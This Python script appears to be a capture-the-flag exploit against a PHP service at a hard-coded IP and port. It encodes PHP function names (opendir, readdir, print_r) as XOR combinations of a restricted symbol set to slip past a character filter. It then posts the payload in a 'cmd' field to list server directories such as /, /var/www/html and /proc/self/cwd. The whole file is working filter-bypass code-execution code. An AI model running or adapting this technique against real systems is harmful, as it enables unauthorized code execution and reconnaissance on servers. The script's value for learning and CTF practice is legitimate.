import requests

session = requests.session()

from pwn import *
from sys import *
burp0_url = "http://103.152.242.37:21203/"
# burp0_url = "http://localhost:9090"

a = "$(),.;=^_{}"
kamus = dict()
for i in a:
	for j in a:
		for k in a:
			for l in a:
				kamus[xor(xor(xor(i, j), k), l)] = (i, j, k, l)



pload = "opendir"
a = ""
b = ""
c = ""
d = ""
for i in pload:
	aa = kamus[i][0]
	bb = kamus[i][1]
	cc = kamus[i][2]
	dd = kamus[i][3]
	a += aa
	b += bb
	c += cc
	d += dd


kotak1 = "$_='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)


# pload = "/var/www/html"
# pload = "/proc/self/cwd"
# pload = "/home/anonim"
# pload = "/"
# pload = "/var/www"

a = ""
b = ""
c = ""
d = ""
for i in pload:
	aa = kamus[i][0]
	bb = kamus[i][1]
	cc = kamus[i][2]
	dd = kamus[i][3]
	a += aa
	b += bb
	c += cc
	d += dd


kotak2 = "$__='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)



pload = "print_r"
a = ""
b = ""
c = ""
d = ""
for i in pload:
	aa = kamus[i][0]
	bb = kamus[i][1]
	cc = kamus[i][2]
	dd = kamus[i][3]
	a += aa
	b += bb
	c += cc
	d += dd


kotak3 = "$___='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)

pload = "readdir"

a = ""
b = ""
c = ""
d = ""
for i in pload:
	aa = kamus[i][0]
	bb = kamus[i][1]
	cc = kamus[i][2]
	dd = kamus[i][3]
	a += aa
	b += bb
	c += cc
	d += dd


kotak4 = "$____='{}'^'{}'^'{}'^'{}';".format(a, b, c, d)


"""
$a=opendir("/");
print_r(readdir($a));
print_r(readdir($a));
print_r(readdir($a));

kotak1 = opendir
kotak2 = /
kotak3 = print_r
kotak4 = readdir
"""



kotak5 ="""$_____=$_($__);$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));$___($____($_____));"""



hasil = kotak1 + kotak2 + kotak3 + kotak4 + kotak5
print(hasil)


burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Content-Type": "application/x-www-form-urlencoded", "Sec-Fetch-User": "?1"}

burp0_data = {"cmd": hasil}

s = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(s.text)
print(s.status_code)